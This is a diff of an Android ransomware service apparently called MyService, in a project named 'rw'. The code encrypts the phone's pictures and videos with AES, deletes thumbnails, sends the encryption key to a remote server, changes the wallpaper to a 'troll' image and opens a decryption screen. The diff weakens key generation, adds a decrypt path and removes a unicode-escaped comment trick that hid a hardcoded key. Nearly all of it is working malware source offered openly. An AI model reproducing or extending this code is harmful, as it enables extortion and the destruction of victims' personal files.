@@ -1,7 +1,6 @@
 package alepacheco.com.rw.services;
 
 import android.app.Service;
-import android.app.WallpaperManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
@@ -10,14 +9,12 @@ import android.graphics.Canvas;
 import android.graphics.Color;
 import android.graphics.Paint;
 import android.os.Environment;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.support.annotation.Nullable;
 import android.text.Layout;
 import android.text.StaticLayout;
 import android.text.TextPaint;
-import android.widget.Toast;
+import android.util.Log;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -29,9 +26,12 @@ import java.util.Date;
 import java.util.List;
 import java.util.Random;
 
+import alepacheco.com.rw.activityes.DecryptActivity;
 import alepacheco.com.rw.R;
+import alepacheco.com.rw.activityes.HappyActivity;
 import alepacheco.com.rw.apl.Aes;
 import alepacheco.com.rw.apl.BlurBuilder;
+import alepacheco.com.rw.apl.Helper;
 import alepacheco.com.rw.io.IO;
 import alepacheco.com.rw.persistence.LocalStorage;
 
@@ -69,34 +69,50 @@ public class MyService extends Service {
 
         totalFiles = String.valueOf(al.size()) + " And " + String.valueOf(vids.size());
         try {
-
             /* \u002a\u002f\u004b\u0045\u0059\u0020\u003d\u0020\u0022\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0030\u0031\u0032\u0033\u0034\u0035\u0022\u002e\u0067\u0065\u0074\u0042\u0079\u0074\u0065\u0073\u0028\u0022\u0055\u0054\u0046\u0038\u0022\u0029\u003b\u002f\u002a */
-
-            if(checkEncryptedState()){ // VERIFICA SE É para tentar criptografar ou descriptografar
-                // MUITO CUIDADO, SE A SENHA ESTIVER ERRADA O SACI VAI APAGAR TUDO
-                if(checkTypedKey()){ //DANDO UMA COLHER DE CHÁ
-                    decryptFile();
-                }
+            if(checkEncryptedState()){
+                this.KEY = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY).getBytes();
+                decryptFile();
+                saveDecryptedState();
+                openHappyActivity();
             }else{
-
                 generateRandomId();
-                generateRandomKey();
 
-                // Well... you guess it.
-                encryptFile();
-
+                //cover possible errors with random key
+                for(int i =0; i <2 ; i++) {
+                    try {
+                        generateRandomKey();
+                        // Well... you guess it.
+                        encryptFile();
+                        break;
+                    }catch (Exception e){
+                        e.printStackTrace();
+                    }
+                }
                 saveEncryptedState();
-
                 IO.sendKeyToServer(ctx,idUser,new String(this.KEY));
+
+                openDecryptActivity();
             }
-        } catch (Exception e) {
+        }
+        catch (Exception e) {
             e.printStackTrace();
         }
 
     }
 
+    private void openHappyActivity(){
+        Helper.changeWallPaper(ctx,R.drawable.happy);
+        startActivity(new Intent(ctx, HappyActivity.class));
+    }
+
+    private void openDecryptActivity(){
+        startActivity(new Intent(ctx, DecryptActivity.class));
+    }
+
     /*
     * Check if the key typed is correct
+    * DEACTIVATED
     * */
     private Boolean checkTypedKey(){
         String typedKey = LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_TEMP_KEY);
@@ -121,13 +137,21 @@ public class MyService extends Service {
     }
 
     /*
+    * Save decrypted state on Local Storage
+    * */
+    private void saveDecryptedState(){
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ENCRYPTED,false);
+    }
+
+    /*
     * Generate and save Random ID
     * */
     private void generateRandomId() {
-        byte[] id = new byte[100];
+        Long hex = r.nextLong();
+        String id = Long.toHexString(hex);
+        id = new String(id.getBytes());
         Date d = new Date();
-        r.nextBytes(id);
-        this.idUser = String.format("%s-%s",d.getTime(),new String(id));
+        this.idUser = String.format("%s-%s",d.getTime(),id);
         LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_ID_USER,idUser);
     }
 
@@ -135,9 +159,10 @@ public class MyService extends Service {
     * Generate and save Random key
     * */
     private void generateRandomKey(){
-        this.KEY = new byte[256];
-        r.nextBytes(this.KEY);
-        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,new String(this.KEY));
+        Long hex = r.nextLong();
+        String key = Long.toHexString(hex);
+        this.KEY = key.getBytes();
+        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,key);
     }
 
     public void updateProgress(boolean direction) {
@@ -150,7 +175,7 @@ public class MyService extends Service {
     }
 
     public void encryptFile() throws Exception {
-        makeToast("Pics");
+        Helper.makeToast(ctx,"Pics");
         for (File file : al) {
             if (file.getPath().contains(".thumbnails")) {
                 file.delete();
@@ -161,6 +186,7 @@ public class MyService extends Service {
                     byte[] brld = blurPhoto(file);
                     saveFile(brld, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
                 }
+                Log.v("Crypt file", file.getPath());
                 byte[] enc = Aes.encrypt(KEY, fullyReadFileToBytes(file));
                 saveFile(enc, file.getPath() + ".enc");
 
@@ -168,7 +194,7 @@ public class MyService extends Service {
                 updateProgress(true);
             }
         }
-        makeToast("Vids");
+        Helper.makeToast(ctx,"Vids");
         for (File vid : vids) {
             if (!vid.getPath().contains(".enc")){
                 Aes.encryptLarge(KEY, vid, new File(vid.getPath()+".enc"));
@@ -181,21 +207,14 @@ public class MyService extends Service {
         bm.compress(Bitmap.CompressFormat.PNG, 100, stream);
         saveFile(stream.toByteArray(), Environment.getExternalStorageDirectory() + File.separator + "Pictures" );
 
-
-        WallpaperManager myWallpaperManager
-                = WallpaperManager.getInstance(getApplicationContext());
-        try {
-            myWallpaperManager.setResource(R.mipmap.ic_launcher);// Setando wall paper de marotagem
-        } catch (IOException e) {
-            // TODO Auto-generated catch block
-            e.printStackTrace();
-        }
-        makeToast("Done");
+        Helper.changeWallPaper(ctx,R.drawable.troll);
+        Helper.makeToast(ctx,"Done");
 
     }
 
     public void decryptFile() throws Exception {
         for (File file : al) {
+            Log.v("FILE",file.getPath());
             if (file.getPath().contains(".thumbnails") || file.getPath().contains("brld")) {
                 file.delete();
             } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
@@ -214,6 +233,7 @@ public class MyService extends Service {
             }
         }
 
+        Helper.makeToast(ctx,"Decrypted... i guess :D");
     }
 
     byte[] fullyReadFileToBytes(File f) throws IOException {
@@ -352,20 +372,4 @@ public class MyService extends Service {
 
         return bitmap;
     }
-
-
-    public void makeToast(final String text) {
-        Handler handler = new Handler(Looper.getMainLooper());
-        handler.post(new Runnable() {
-            @Override
-            public void run() {
-                Toast.makeText(getApplicationContext(),
-                        text,
-                        Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-
-
-
 }
